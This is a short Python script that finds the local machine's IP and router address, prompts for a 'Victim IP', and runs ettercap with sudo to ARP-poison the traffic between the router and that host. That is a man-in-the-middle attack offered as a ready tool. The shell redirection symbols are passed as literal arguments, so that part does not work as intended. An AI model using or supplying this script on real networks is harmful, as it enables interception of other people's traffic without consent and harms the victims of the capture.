import socket
import subprocess

def get_local_ip():
    try:
        # Create a socket to get the local machine's IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))  # Connect to a public DNS server
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print(f"Error getting local IP address: {e}")
        return None

def get_router_ip():
    try:
        # Run a subprocess to get the default gateway (router) IP address
        result = subprocess.check_output(["ip", "route", "show", "default"]).decode("utf-8")
        router_ip = result.split()[2]
        return router_ip
    except Exception as e:
        print(f"Error getting router IP address: {e}")
        return None

if __name__ == "__main__":
    local_ip = get_local_ip()
    router_ip = get_router_ip()

    if local_ip and router_ip:
        print(f"Local IP address: {local_ip}")
        print(f"Router IP address: {router_ip}")
    else:
        print("Failed to retrieve IP addresses.")
victim_ip=str(input("Enter Victim IP:"))

router_path = f"/{router_ip}//"
victim_path = f"/{victim_ip}//"

command = ["sudo", "ettercap", "-T", "-q", "-M", "arp:remote", router_path, victim_path, ">", "/dev/null", "2>&1", "&"]
result = subprocess.run(command)





